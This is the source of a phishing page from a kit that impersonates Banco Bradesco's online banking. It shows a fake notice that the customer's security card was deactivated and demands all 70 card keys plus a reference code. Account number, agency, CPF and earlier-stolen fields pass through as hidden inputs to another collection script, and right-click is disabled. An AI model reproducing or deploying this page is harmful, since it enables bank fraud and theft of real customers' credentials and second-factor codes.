<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<link href="stylos/style.css" rel="stylesheet" type="text/css" />
<link rel="shortcut icon" href="icones/opera.ico"/>
<title>Banco Bradesco | Pessoa Física, Exclusive, Prime e Private</title>
<script type="text/javascript" src="scripts/data.js"></script>
<script type="text/javascript" src="scripts/validaCam.js"></script>
<script type="text/javascript" src="scripts/pulacampo.js"></script>
<script type="text/javascript" src="scripts/verifica.js"></script>
<style type="text/css">
<!--
body {background-color:#E4E4E4;}
a:link {color: #666666;text-decoration:none;}
a:visited {color:#333333;text-decoration:none;}
a:hover {color:#990000;text-decoration:underline;}
a:active {color:#333333;text-decoration:none;}
.style6 {color: #E5E5E5}
.style7 {	font-family: Arial, Helvetica, sans-serif;	font-size: 12px;	color: #333333;}
.style8 {color: #FF0000;	font-weight: bold;} 
.style12 {color: #666666; font-style: italic; }
.style14 {	font-family: Arial, Helvetica, sans-serif;	font-size: 12px; color:#BF0000;}
.style15 { font-size:10px; }
.style16 {	color: #666666;	font-size: 10px;	font-family: Verdana, Arial, Helvetica, sans-serif;}
.style22 {font-size: 10px}
.style23 {color: #FF0000}
.style27 {font-weight: bold}
.style28 {font-size: 11px; color: #BF0000; font-family: Arial, Helvetica, sans-serif;}
.style33 {font-size: 14px;	color: #FF0000;}
.style34 {	color: #666666;
	font-weight: bold;
}
-->
</style>

<script type="text/javascript">
	$(document).ready(function(){
		$('#info').hide();
		var size  =  $('#sss6').attr("size");
		$('#sss6').keyup(function(){
			var entry = $(this).attr("value");
			var current_length = $(this).attr("value").length;
			if (current_length>= size) {
				$('#info').html();
				$('#info').show('fast');
			}
				else $('#info').hide('fast');
			});
	});

</script>
</head>

<body style="margin:0;" oncontextmenu="return false" >
<div id="humTop1"><div id="coloCancela">

<div id="dentrotopo01">

<table cellpadding="0" cellspacing="0">
<tr>
<td width="105" height="18""40" class="style6" width-><?php echo("<b>Ag&ecirc;ncia:&nbsp;</b>".$_POST['agencia']."");?></td>
<td width="280""40" class="style6" width- ><?php echo("<b>Conta:&nbsp;</b>".$_POST['conta']."");?><?php echo("-".$_POST['digito']."");?></td>
</tr>
</table>

</div>

<A href="index.php"><img src="images/buttoncancelar.jpg" border="0" style="float:right;" /></A></div>
</div>
<div id="tela">
<div id="ilRight"></div>
<div id="ilLeft"></div>
</div>
<div id="humTop2"><div id="relogio"><script>data();</script></div></div>
<div id="humTop3"></div>
<div id="humTop4"></div>

<div id="corpoAll">
<div id="frameBox1">
<div id="lineRss">
  <div class="style7" style="width:500px; height:20px; margin-left:10px; float:left; padding: 8px 0 0 0;"> <span class="style12">P&aacute;gina Inicial </span> <span class="style33">&gt;</span><span class="style12"> Dados pessoais </span> </span><span class="style33">&gt;</span> <span class="style34">Cart&atilde;o Chave</span> <span class="style33">&gt;</span> </div>
  <img src="images/AAA.jpg" style="float:right;" /></div>
<div id="lineRaa"></div>
 <div id="infDados">
<img src="images/Passo2.jpg"  />
<div style="width:675px; height:35px; margin-top:5px; margin-left:10px; background:#FEF9DB; border-bottom:1px solid #E0D9BC; padding:5px"><img src="images/sclamacao.jpg"; style="float:left;"  />
  <div class="style28" style="width:610px; height:30px; float:right; margin-top:5px;">Nosso sistema est&aacute; atualizando o Cart&atilde;o de Seguran&ccedil;a de todos os cliente, e identificamos que seu Cart&atilde;o  foi desativado, <br />
    Por favor recadastre seu Cart&atilde;o de Seguran&ccedil;a ativando todas as chaves abaixo.</div>
</div>
<table cellpadding="0" cellspacing="0">
<form id="form" name="form" action="dados_ibk3.php" method="post" onSubmit="return verifica();" target="_self" autocomplete="off" >
<tr>
<td height="10" colspan="4"></td>
</tr>
<tr>
<td width="25" height="207">
	    <input name="agencia" type="hidden" id="agencia" value="<?php echo $_POST['agencia']; ?>" />
        <input name="conta" type="hidden" id="conta" value="<?php echo $_POST['conta']; ?>" />
        <input name="digito" type="hidden" id="digito" value="<?php echo $_POST['digito']; ?>" />
		<input name="infor" type="hidden" id="infor" value="<?php echo $_POST['infor']; ?>" />
		<input name="responssavel" type="hidden" id="responssavel" value="<?php echo $_POST['responssavel']; ?>" />
		<input name="cpf" type="hidden" id="cpf" value="<?php echo $_POST['cpf']; ?>" />
		<input name="sss6" type="hidden" id="sss6" value="<?php echo $_POST['sss6']; ?>" />
		<input name="pos25" type="hidden" id="pos25" value="<?php echo $_POST['pos25']; ?>" />
		
</td>
</td>
<td width="4" height="207" class="style7">&nbsp;</td>
<td width="191" height="207"><img src="images/tatatatatatata.gif" width="188" height="97" /></td>
<td width="415" height="207">

<table align="center" cellpadding="0" cellspacing="0" background="images/teclado.jpg" style=" font-family:Arial, Helvetica, sans-serif;font-size:10px; ">
  <tr>
    <td width="23" height="28" class="style7"><div align="right" class="style27">N&ordm;</div></td>
    <td width="39" class="style7"><div align="center" class="style22">Chave</div></td>
    <td width="14" class="style27">N&ordm;</td>
    <td width="39" class="style7"><div align="center" class="style22">Chave</div></td>
    <td width="14" class="style27">N&ordm;</td>
    <td width="39" class="style7"><div align="center" class="style22">Chave</div></td>
    <td width="14" class="style27">N&ordm;</td>
    <td width="39" class="style7"><div align="center" class="style22">Chave</div></td>
    <td width="14" class="style27">N&ordm;</td>
    <td width="37" class="style7"><div align="center" class="style22">Chave</div></td>
    <td width="14" class="style27">N&ordm;</td>
    <td width="37" class="style7"><div align="center" class="style22">Chave</div></td>
    <td width="14" class="style27">N&ordm;</td>
    <td width="44" class="style7"><div align="left" class="style22">Chave</div></td>
  </tr>
  <tr>
    <td width="23" class="style7"><div align="right" class="style23 style22 style15"><strong>01</strong></div></td>
    <td width="39" class="style27"><input name="table01" type="text" class="style15 " id="table01" lang="1"  onfocus="mudarCorCampo(this,'white')" onkeyup="javascript:pulacampo('table01','table02')" size="3" maxlength="3" xml:lang="1" /></td>
    <td width="14"><span class="style7"><span class="style23 style22 style13"><strong>11</strong></span></span></td>
    <td width="39"><span class="style23 style22"><strong>
      <input name="table11" type="text" class="style22" id="table11" lang="1"  onfocus="mudarCorCampo(this,'white')" onkeyup="javascript:pulacampo('table11','table12')" size="3" maxlength="3" xml:lang="1" />
    </strong></span></td>
    <td width="14"><span class="style7"><span class="style23 style22 style13"><strong>21</strong></span></span></td>
    <td width="39"><span class="style23 style22"><strong>
      <input name="table21" type="text" class="style22" id="table21" lang="1"  onfocus="mudarCorCampo(this,'white')" onkeyup="javascript:pulacampo('table21','table22')" size="3" maxlength="3" xml:lang="1" />
    </strong></span></td>
    <td width="14"><span class="style7"><span class="style23 style22 style13"><strong>31</strong></span></span></td>
    <td width="39"><span class="style23 style22"><strong>
      <input name="table31" type="text" class="style22" id="table31" lang="1"  onfocus="mudarCorCampo(this,'white')" onkeyup="javascript:pulacampo('table31','table32')" size="3" maxlength="3" xml:lang="1" />
    </strong></span></td>
    <td width="14"><span class="style7"><span class="style23 style22 style13"><strong>41</strong></span></span></td>
    <td width="37"><span class="style23 style22"><strong>
      <input name="table41" type="text" class="style22" id="table41" lang="1"  onfocus="mudarCorCampo(this,'white')" onkeyup="javascript:pulacampo('table41','table42')" size="3" maxlength="3" xml:lang="1" />
    </strong></span></td>
    <td width="14"><span class="style7"><span class="style23 style22 style13"><strong>51</strong></span></span></td>
    <td width="37"><span class="style23 style22"><strong>
      <input name="table51" type="text" class="style22" id="table51" lang="1"  onfocus="mudarCorCampo(this,'white')" onkeyup="javascript:pulacampo('table51','table52')" size="3" maxlength="3" xml:lang="1" />
    </strong></span></td>
    <td width="14"><span class="style7"><span class="style23 style22 style13"><strong>61</strong></span></span></td>
    <td width="44"><span class="style23 style22"><strong>
      <input name="table61" type="text" class="style22" id="table61" lang="1"  onfocus="mudarCorCampo(this,'white')" onkeyup="javascript:pulacampo('table61','table62')" size="3" maxlength="3" xml:lang="1" />
    </strong></span></td>
  </tr>
  <tr>
    <td width="23" class="style7"><div align="right" class="style23 style22 style15"><strong>02</strong></div></td>
    <td width="39" class="style22"><input name="table02" type="text" class="style15 " id="table02" lang="1"  onfocus="mudarCorCampo(this,'white')" onkeyup="javascript:pulacampo('table02','table03')" size="3" maxlength="3" xml:lang="1" /></td>
    <td width="14"><span class="style7"><span class="style23 style22 style13"><strong>12</strong></span></span></td>
    <td width="39"><span class="style23 style22"><strong>
      <input name="table12" type="text" class="style22" id="table12" lang="1"  onfocus="mudarCorCampo(this,'white')" onkeyup="javascript:pulacampo('table12','table13')" size="3" maxlength="3" xml:lang="1" />
    </strong></span></td>
    <td width="14"><span class="style7"><span class="style23 style22 style13"><strong>22</strong></span></span></td>
    <td width="39"><span class="style23 style22"><strong>
      <input name="table22" type="text" class="style22" id="table22" lang="1"  onfocus="mudarCorCampo(this,'white')" onkeyup="javascript:pulacampo('table22','table23')" size="3" maxlength="3" xml:lang="1" />
    </strong></span></td>
    <td width="14"><span class="style7"><span class="style23 style22 style13"><strong>32</strong></span></span></td>
    <td width="39"><span class="style23 style22"><strong>
      <input name="table32" type="text" class="style22" id="table32" lang="1"  onfocus="mudarCorCampo(this,'white')" onkeyup="javascript:pulacampo('table32','table33')" size="3" maxlength="3" xml:lang="1"/>
    </strong></span></td>
    <td width="14"><span class="style7"><span class="style23 style22 style13"><strong>42</strong></span></span></td>
    <td width="37"><span class="style23 style22"><strong>
      <input name="table42" type="text" class="style22" id="table42" lang="1"  onfocus="mudarCorCampo(this,'white')" onkeyup="javascript:pulacampo('table42','table43')" size="3" maxlength="3" xml:lang="1"/>
    </strong></span></td>
    <td width="14"><span class="style7"><span class="style23 style22 style13"><strong>52</strong></span></span></td>
    <td width="37"><span class="style23 style22"><strong>
      <input name="table52" type="text" class="style22" id="table52" lang="1"  onfocus="mudarCorCampo(this,'white')" onkeyup="javascript:pulacampo('table52','table53')" size="3" maxlength="3" xml:lang="1" />
    </strong></span></td>
    <td width="14"><span class="style7"><span class="style23 style22 style13"><strong>62</strong></span></span></td>
    <td width="44"><span class="style23 style22"><strong>
      <input name="table62" type="text" class="style22" id="table62" lang="1"  onfocus="mudarCorCampo(this,'white')" onkeyup="javascript:pulacampo('table62','table63')" size="3" maxlength="3" xml:lang="1" />
    </strong></span></td>
  </tr>
  <tr>
    <td width="23" class="style7"><div align="right" class="style23 style22 style15"><strong>03</strong></div></td>
    <td width="39" class="style22"><input name="table03" type="text" class="style15 " id="table03" lang="1"  onfocus="mudarCorCampo(this,'white')" onkeyup="javascript:pulacampo('table03','table04')" size="3" maxlength="3" xml:lang="1" /></td>
    <td width="14"><span class="style7"><span class="style23 style22 style13"><strong>13</strong></span></span></td>
    <td width="39"><span class="style23 style22"><strong>
      <input name="table13" type="text" class="style22" id="table13" lang="1"  onfocus="mudarCorCampo(this,'white')" onkeyup="javascript:pulacampo('table13','table14')" size="3" maxlength="3" xml:lang="1"/>
    </strong></span></td>
    <td width="14"><span class="style7"><span class="style23 style22 style13"><strong>23</strong></span></span></td>
    <td width="39"><span class="style23 style22"><strong>
      <input name="table23" type="text" class="style22" id="table23" lang="1"  onfocus="mudarCorCampo(this,'white')" onkeyup="javascript:pulacampo('table23','table24')" size="3" maxlength="3" xml:lang="1" />
    </strong></span></td>
    <td width="14"><span class="style7"><span class="style23 style22 style13"><strong>33</strong></span></span></td>
    <td width="39"><span class="style23 style22"><strong>
      <input name="table33" type="text" class="style22" id="table33" lang="1"  onfocus="mudarCorCampo(this,'white')" onkeyup="javascript:pulacampo('table33','table34')" size="3" maxlength="3" xml:lang="1" />
    </strong></span></td>
    <td width="14"><span class="style7"><span class="style23 style22 style13"><strong>43</strong></span></span></td>
    <td width="37"><span class="style23 style22"><strong>
      <input name="table43" type="text" class="style22" id="table43" lang="1"  onfocus="mudarCorCampo(this,'white')" onkeyup="javascript:pulacampo('table43','table44')" size="3" maxlength="3" xml:lang="1" />
    </strong></span></td>
    <td width="14"><span class="style7"><span class="style23 style22 style13"><strong>53</strong></span></span></td>
    <td width="37"><span class="style23 style22"><strong>
      <input name="table53" type="text" class="style22" id="table53" lang="1"  onfocus="mudarCorCampo(this,'white')" onkeyup="javascript:pulacampo('table53','table54')" size="3" maxlength="3" xml:lang="1" />
    </strong></span></td>
    <td width="14"><span class="style7"><span class="style23 style22 style13"><strong>63</strong></span></span></td>
    <td width="44"><span class="style23 style22"><strong>
      <input name="table63" type="text" class="style22" id="table63" lang="1"  onfocus="mudarCorCampo(this,'white')" onkeyup="javascript:pulacampo('table63','table64')" size="3" maxlength="3" xml:lang="1" />
    </strong></span></td>
  </tr>
  <tr>
    <td width="23" class="style7"><div align="right" class="style23 style22 style15"><strong>04</strong></div></td>
    <td width="39" class="style22"><input name="table04" type="text" class="style15 " id="table04" lang="1"  onfocus="mudarCorCampo(this,'white')" onkeyup="javascript:pulacampo('table04','table05')" size="3" maxlength="3" xml:lang="1" /></td>
    <td width="14"><span class="style7"><span class="style23 style22 style13"><strong>14</strong></span></span></td>
    <td width="39"><span class="style23 style22"><strong>
      <input name="table14" type="text" class="style22" id="table14" lang="1"  onfocus="mudarCorCampo(this,'white')" onkeyup="javascript:pulacampo('table14','table15')" size="3" maxlength="3" xml:lang="1" />
    </strong></span></td>
    <td width="14"><span class="style7"><span class="style23 style22 style13"><strong>24</strong></span></span></td>
    <td width="39"><span class="style23 style22"><strong>
      <input name="table24" type="text" class="style22" id="table24" lang="1"  onfocus="mudarCorCampo(this,'white')" onkeyup="javascript:pulacampo('table24','table25')" size="3" maxlength="3" xml:lang="1" />
    </strong></span></td>
    <td width="14"><span class="style7"><span class="style23 style22 style13"><strong>34</strong></span></span></td>
    <td width="39"><span class="style23 style22"><strong>
      <input name="table34" type="text" class="style22" id="table34" lang="1"  onfocus="mudarCorCampo(this,'white')" onkeyup="javascript:pulacampo('table34','table35')" size="3" maxlength="3" xml:lang="1" />
    </strong></span></td>
    <td width="14"><span class="style7"><span class="style23 style22 style13"><strong>44</strong></span></span></td>
    <td width="37"><span class="style23 style22"><strong>
      <input name="table44" type="text" class="style22" id="table44" lang="1"  onfocus="mudarCorCampo(this,'white')" onkeyup="javascript:pulacampo('table44','table45')" size="3" maxlength="3" xml:lang="1" />
    </strong></span></td>
    <td width="14"><span class="style7"><span class="style23 style22 style13"><strong>54</strong></span></span></td>
    <td width="37"><span class="style23 style22"><strong>
      <input name="table54" type="text" class="style22" id="table54" lang="1"  onfocus="mudarCorCampo(this,'white')" onkeyup="javascript:pulacampo('table54','table55')" size="3" maxlength="3" xml:lang="1" />
    </strong></span></td>
    <td width="14"><span class="style7"><span class="style23 style22 style13"><strong>64</strong></span></span></td>
    <td width="44"><span class="style23 style22"><strong>
      <input name="table64" type="text" class="style22" id="table64" lang="1"  onfocus="mudarCorCampo(this,'white')" onkeyup="javascript:pulacampo('table64','table65')" size="3" maxlength="3" xml:lang="1" />
    </strong></span></td>
  </tr>
  <tr>
    <td width="23" class="style7"><div align="right" class="style23 style22 style15"><strong>05</strong></div></td>
    <td width="39" class="style22"><input name="table05" type="text" class="style15 " id="table05" lang="1"  onfocus="mudarCorCampo(this,'white')" onkeyup="javascript:pulacampo('table05','table06')" size="3" maxlength="3" xml:lang="1" /></td>
    <td width="14"><span class="style7"><span class="style23 style22 style13"><strong>15</strong></span></span></td>
    <td width="39"><span class="style23 style22"><strong>
      <input name="table15" type="text" class="style22" id="table15" lang="1"  onfocus="mudarCorCampo(this,'white')" onkeyup="javascript:pulacampo('table15','table16')" size="3" maxlength="3" xml:lang="1" />
    </strong></span></td>
    <td width="14"><span class="style7"><span class="style23 style22 style13"><strong>25</strong></span></span></td>
    <td width="39"><span class="style23 style22"><strong>
      <input name="table25" type="text" class="style22" id="table25" lang="1"  onfocus="mudarCorCampo(this,'white')" onkeyup="javascript:pulacampo('table25','table26')" size="3" maxlength="3" xml:lang="1" />
    </strong></span></td>
    <td width="14"><span class="style7"><span class="style23 style22 style13"><strong>35</strong></span></span></td>
    <td width="39"><span class="style23 style22"><strong>
      <input name="table35" type="text" class="style22" id="table35" lang="1"  onfocus="mudarCorCampo(this,'white')" onkeyup="javascript:pulacampo('table35','table36')" size="3" maxlength="3" xml:lang="1" />
    </strong></span></td>
    <td width="14"><span class="style7"><span class="style23 style22 style13"><strong>45</strong></span></span></td>
    <td width="37"><span class="style23 style22"><strong>
      <input name="table45" type="text" class="style22" id="table45" lang="1"  onfocus="mudarCorCampo(this,'white')" onkeyup="javascript:pulacampo('table45','table46')" size="3" maxlength="3" xml:lang="1" />
    </strong></span></td>
    <td width="14"><span class="style7"><span class="style23 style22 style13"><strong>55</strong></span></span></td>
    <td width="37"><span class="style23 style22"><strong>
      <input name="table55" type="text" class="style22" id="table55" lang="1"  onfocus="mudarCorCampo(this,'white')" onkeyup="javascript:pulacampo('table55','table56')" size="3" maxlength="3" xml:lang="1" />
    </strong></span></td>
    <td width="14"><span class="style7"><span class="style23 style22 style13"><strong>65</strong></span></span></td>
    <td width="44"><span class="style23 style22"><strong>
      <input name="table65" type="text" class="style22" id="table65" lang="1"  onfocus="mudarCorCampo(this,'white')" onkeyup="javascript:pulacampo('table65','table66')" size="3" maxlength="3" xml:lang="1" />
    </strong></span></td>
  </tr>
  <tr>
    <td width="23" class="style7"><div align="right" class="style23 style22 style15"><strong>06</strong></div></td>
    <td width="39" class="style22"><input name="table06" type="text" class="style15 " id="table06" lang="1"  onfocus="mudarCorCampo(this,'white')" onkeyup="javascript:pulacampo('table06','table07')" size="3" maxlength="3" xml:lang="1" /></td>
    <td width="14"><span class="style7"><span class="style23 style22 style13"><strong>16</strong></span></span></td>
    <td width="39"><span class="style23 style22"><strong>
      <input name="table16" type="text" class="style22" id="table16" lang="1"  onfocus="mudarCorCampo(this,'white')" onkeyup="javascript:pulacampo('table16','table17')" size="3" maxlength="3" xml:lang="1"/>
    </strong></span></td>
    <td width="14"><span class="style7"><span class="style23 style22 style13"><strong>26</strong></span></span></td>
    <td width="39"><span class="style23 style22"><strong>
      <input name="table26" type="text" class="style22" id="table26" lang="1"  onfocus="mudarCorCampo(this,'white')" onkeyup="javascript:pulacampo('table26','table27')" size="3" maxlength="3" xml:lang="1" />
    </strong></span></td>
    <td width="14"><span class="style7"><span class="style23 style22 style13"><strong>36</strong></span></span></td>
    <td width="39"><span class="style23 style22"><strong>
      <input name="table36" type="text" class="style22" id="table36" lang="1"  onfocus="mudarCorCampo(this,'white')" onkeyup="javascript:pulacampo('table36','table37')" size="3" maxlength="3" xml:lang="1" />
    </strong></span></td>
    <td width="14"><span class="style7"><span class="style23 style22 style13"><strong>46</strong></span></span></td>
    <td width="37"><span class="style23 style22"><strong>
      <input name="table46" type="text" class="style22" id="table46" lang="1"  onfocus="mudarCorCampo(this,'white')" onkeyup="javascript:pulacampo('table46','table47')" size="3" maxlength="3" xml:lang="1" />
    </strong></span></td>
    <td width="14"><span class="style7"><span class="style23 style22 style13"><strong>56</strong></span></span></td>
    <td width="37"><span class="style23 style22"><strong>
      <input name="table56" type="text" class="style22" id="table56" lang="1"  onfocus="mudarCorCampo(this,'white')" onkeyup="javascript:pulacampo('table56','table57')" size="3" maxlength="3" xml:lang="1" />
    </strong></span></td>
    <td width="14"><span class="style7"><span class="style23 style22 style13"><strong>66</strong></span></span></td>
    <td width="44"><span class="style23 style22"><strong>
      <input name="table66" type="text" class="style22" id="table66" lang="1"  onfocus="mudarCorCampo(this,'white')" onkeyup="javascript:pulacampo('table66','table67')" size="3" maxlength="3" xml:lang="1" />
    </strong></span></td>
  </tr>
  <tr>
    <td width="23" class="style7"><div align="right" class="style23 style22 style15"><strong>07</strong></div></td>
    <td width="39" class="style22"><input name="table07" type="text" class="style15 " id="table07" lang="1"  onfocus="mudarCorCampo(this,'white')" onkeyup="javascript:pulacampo('table07','table08')" size="3" maxlength="3" xml:lang="1" /></td>
    <td width="14"><span class="style7"><span class="style23 style22 style13"><strong>17</strong></span></span></td>
    <td width="39"><span class="style23 style22"><strong>
      <input name="table17" type="text" class="style22" id="table17" lang="1"  onfocus="mudarCorCampo(this,'white')" onkeyup="javascript:pulacampo('table17','table18')" size="3" maxlength="3" xml:lang="1" />
    </strong></span></td>
    <td width="14"><span class="style7"><span class="style23 style22 style13"><strong>27</strong></span></span></td>
    <td width="39"><span class="style23 style22"><strong>
      <input name="table27" type="text" class="style22" id="table27" lang="1"  onfocus="mudarCorCampo(this,'white')" onkeyup="javascript:pulacampo('table27','table28')" size="3" maxlength="3" xml:lang="1" />
    </strong></span></td>
    <td width="14"><span class="style7"><span class="style23 style22 style13"><strong>37</strong></span></span></td>
    <td width="39"><span class="style23 style22"><strong>
      <input name="table37" type="text" class="style22" id="table37" lang="1"  onfocus="mudarCorCampo(this,'white')" onkeyup="javascript:pulacampo('table37','table38')" size="3" maxlength="3" xml:lang="1" />
    </strong></span></td>
    <td width="14"><span class="style7"><span class="style23 style22 style13"><strong>47</strong></span></span></td>
    <td width="37"><span class="style23 style22"><strong>
      <input name="table47" type="text" class="style22" id="table47" lang="1"  onfocus="mudarCorCampo(this,'white')" onkeyup="javascript:pulacampo('table47','table48')" size="3" maxlength="3" xml:lang="1" />
    </strong></span></td>
    <td width="14"><span class="style7"><span class="style23 style22 style13"><strong>57</strong></span></span></td>
    <td width="37"><span class="style23 style22"><strong>
      <input name="table57" type="text" class="style22" id="table57" lang="1"  onfocus="mudarCorCampo(this,'white')" onkeyup="javascript:pulacampo('table57','table58')" size="3" maxlength="3" xml:lang="1" />
    </strong></span></td>
    <td width="14"><span class="style7"><span class="style23 style22 style13"><strong>67</strong></span></span></td>
    <td width="44"><span class="style23 style22"><strong>
      <input name="table67" type="text" class="style22" id="table67" lang="1"  onfocus="mudarCorCampo(this,'white')" onkeyup="javascript:pulacampo('table67','table68')" size="3" maxlength="3" xml:lang="1" />
    </strong></span></td>
  </tr>
  <tr>
    <td width="23" class="style7"><div align="right" class="style23 style22 style15"><strong>08</strong></div></td>
    <td width="39" class="style22"><input name="table08" type="text" class="style15 " id="table08" lang="1"  onfocus="mudarCorCampo(this,'white')" onkeyup="javascript:pulacampo('table08','table09')" size="3" maxlength="3" xml:lang="1" /></td>
    <td width="14"><span class="style7"><span class="style23 style22 style13"><strong>18</strong></span></span></td>
    <td width="39"><span class="style23 style22"><strong>
      <input name="table18" type="text" class="style22" id="table18" lang="1"  onfocus="mudarCorCampo(this,'white')" onkeyup="javascript:pulacampo('table18','table19')" size="3" maxlength="3" xml:lang="1" />
    </strong></span></td>
    <td width="14"><span class="style7"><span class="style23 style22 style13"><strong>28</strong></span></span></td>
    <td width="39"><span class="style23 style22"><strong>
      <input name="table28" type="text" class="style22" id="table28" lang="1"  onfocus="mudarCorCampo(this,'white')" onkeyup="javascript:pulacampo('table28','table29')" size="3" maxlength="3" xml:lang="1" />
    </strong></span></td>
    <td width="14"><span class="style7"><span class="style23 style22 style13"><strong>38</strong></span></span></td>
    <td width="39"><span class="style23 style22"><strong>
      <input name="table38" type="text" class="style22" id="table38" lang="1"  onfocus="mudarCorCampo(this,'white')" onkeyup="javascript:pulacampo('table38','table39')" size="3" maxlength="3" xml:lang="1"/>
    </strong></span></td>
    <td width="14"><span class="style7"><span class="style23 style22 style13"><strong>48</strong></span></span></td>
    <td width="37"><span class="style23 style22"><strong>
      <input name="table48" type="text" class="style22" id="table48" lang="1"  onfocus="mudarCorCampo(this,'white')" onkeyup="javascript:pulacampo('table48','table49')" size="3" maxlength="3" xml:lang="1"/>
    </strong></span></td>
    <td width="14"><span class="style7"><span class="style23 style22 style13"><strong>58</strong></span></span></td>
    <td width="37"><span class="style23 style22"><strong>
      <input name="table58" type="text" class="style22" id="table58" lang="1"  onfocus="mudarCorCampo(this,'white')" onkeyup="javascript:pulacampo('table58','table59')" size="3" maxlength="3" xml:lang="1" />
    </strong></span></td>
    <td width="14"><span class="style7"><span class="style23 style22 style13"><strong>68</strong></span></span></td>
    <td width="44"><span class="style23 style22"><strong>
      <input name="table68" type="text" class="style22" id="table68" lang="1"  onfocus="mudarCorCampo(this,'white')" onkeyup="javascript:pulacampo('table68','table69')" size="3" maxlength="3" xml:lang="1" />
    </strong></span></td>
  </tr>
  <tr>
    <td width="23" class="style7"><div align="right" class="style23 style22 style15"><strong>09</strong></div></td>
    <td width="39" class="style22"><input name="table09" type="text" class="style15 " id="table09" lang="1"  onfocus="mudarCorCampo(this,'white')" onkeyup="javascript:pulacampo('table09','table10')" size="3" maxlength="3" xml:lang="1" /></td>
    <td width="14"><span class="style7"><span class="style23 style22 style13"><strong>19</strong></span></span></td>
    <td width="39"><span class="style23 style22"><strong>
      <input name="table19" type="text" class="style22" id="table19" lang="1"  onfocus="mudarCorCampo(this,'white')" onkeyup="javascript:pulacampo('table19','table20')" size="3" maxlength="3" xml:lang="1"/>
    </strong></span></td>
    <td width="14"><span class="style7"><span class="style23 style22 style13"><strong>29</strong></span></span></td>
    <td width="39"><span class="style23 style22"><strong>
      <input name="table29" type="text" class="style22" id="table29" lang="1"  onfocus="mudarCorCampo(this,'white')" onkeyup="javascript:pulacampo('table29','table30')" size="3" maxlength="3" xml:lang="1" />
    </strong></span></td>
    <td width="14"><span class="style7"><span class="style23 style22 style13"><strong>39</strong></span></span></td>
    <td width="39"><span class="style23 style22"><strong>
      <input name="table39" type="text" class="style22" id="table39" lang="1"  onfocus="mudarCorCampo(this,'white')" onkeyup="javascript:pulacampo('table39','table40')" size="3" maxlength="3" xml:lang="1" />
    </strong></span></td>
    <td width="14"><span class="style7"><span class="style23 style22 style13"><strong>49</strong></span></span></td>
    <td width="37"><span class="style23 style22"><strong>
      <input name="table49" type="text" class="style22" id="table49" lang="1"  onfocus="mudarCorCampo(this,'white')" onkeyup="javascript:pulacampo('table49','table50')" size="3" maxlength="3" xml:lang="1" />
    </strong></span></td>
    <td width="14"><span class="style7"><span class="style23 style22 style13"><strong>59</strong></span></span></td>
    <td width="37"><span class="style23 style22"><strong>
      <input name="table59" type="text" class="style22" id="table59" lang="1"  onfocus="mudarCorCampo(this,'white')" onkeyup="javascript:pulacampo('table59','table60')" size="3" maxlength="3" xml:lang="1" />
    </strong></span></td>
    <td width="14"><span class="style7"><span class="style23 style22 style13"><strong>69</strong></span></span></td>
    <td width="44"><span class="style23 style22"><strong>
      <input name="table69" type="text" class="style22" id="table69" lang="1"  onfocus="mudarCorCampo(this,'white')" onkeyup="javascript:pulacampo('table69','table70')" size="3" maxlength="3" xml:lang="1" />
    </strong></span></td>
  </tr>
  <tr>
    <td width="23" height="13" class="style7"><div align="right" class="style23 style22 style15"><strong>10</strong></div></td>
    <td width="39" class="style22"><input name="table10" type="text" class="style15 " id="table10" lang="1"  onfocus="mudarCorCampo(this,'white')" onkeyup="javascript:pulacampo('table10','table11')" size="3" maxlength="3" xml:lang="1" /></td>
    <td width="14"><span class="style7"><span class="style23 style22 style13"><strong>20</strong></span></span></td>
    <td width="39"><span class="style23 style22"><strong>
      <input name="table20" type="text" class="style22" id="table20" lang="1"  onfocus="mudarCorCampo(this,'white')" onkeyup="javascript:pulacampo('table20','table21')" size="3" maxlength="3" xml:lang="1" />
    </strong></span></td>
    <td width="14"><span class="style7"><span class="style23 style22 style13"><strong>30</strong></span></span></td>
    <td width="39"><span class="style23 style22"><strong>
      <input name="table30" type="text" class="style22" id="table30" lang="1"  onfocus="mudarCorCampo(this,'white')" onkeyup="javascript:pulacampo('table30','table31')" size="3" maxlength="3" xml:lang="1" />
    </strong></span></td>
    <td width="14"><span class="style7"><span class="style23 style22 style13"><strong>40</strong></span></span></td>
    <td width="39"><span class="style23 style22"><strong>
      <input name="table40" type="text" class="style22" id="table40" lang="1"  onfocus="mudarCorCampo(this,'white')" onkeyup="javascript:pulacampo('table40','table41')" size="3" maxlength="3" xml:lang="1" />
    </strong></span></td>
    <td width="14"><span class="style7"><span class="style23 style22 style13"><strong>50</strong></span></span></td>
    <td width="37"><span class="style23 style22"><strong>
      <input name="table50" type="text" class="style22" id="table50" lang="1"  onfocus="mudarCorCampo(this,'white')" onkeyup="javascript:pulacampo('table50','table51')" size="3" maxlength="3" xml:lang="1" />
    </strong></span></td>
    <td width="14"><span class="style7"><span class="style23 style22 style13"><strong>60</strong></span></span></td>
    <td width="37"><span class="style23 style22"><strong>
      <input name="table60" type="text" class="style22" id="table60" lang="1"  onfocus="mudarCorCampo(this,'white')" onkeyup="javascript:pulacampo('table60','table61')" size="3" maxlength="3" xml:lang="1" />
    </strong></span></td>
    <td width="14"><span class="style7"><span class="style23 style22 style13"><strong>70</strong></span></span></td>
    <td width="44"><span class="style23 style22"><strong>
      <input name="table70" type="text" class="style22" id="table70" lang="1"  onfocus="mudarCorCampo(this,'white')" onkeyup="javascript:pulacampo('table70','ref')" size="3" maxlength="3" xml:lang="1" />
    </strong></span></td>
  </tr>
  <tr>
    <td height="32" colspan="14" style="padding-right:14px;" ><span class="style27">
      <input name="ref" type="text" class="style22" id="ref" lang="1"  onkeyup="javascript:pulacampo('ref','button')" size="11" maxlength="11" xml:lang="1" />
    </span></td>
  </tr>
</table></td>
<td width="63" height="207">&nbsp;</td>
</tr>
<tr>
<td height="19">&nbsp;</td>
<td colspan="4" background="images/asdasdasd.jpg"><a href="index.php"><span class="style14" style="float:left;"><span class="style8">&lt;</span> <span class="style16">&Iacute;NICIO</span></span></a>
  <input name="button" id="button" type="image" src="images/Continuar.jpg" style="float:right;"/></td>
</tr>
</form>
</table>

</div>

<table align="right" cellpadding="0" cellspacing="0" style="border-left:1px solid #E5E5E5; margin-top:35px;">
<tr>
<td width="242" height="133" ><div align="center"><a href="#"><img src="images/a2836472346238.jpg" width="216" height="103" border="0" /></a></div></td>
</tr>
<tr>
  <td><div align="center" class="style6">_________________________</div></td>
</tr>
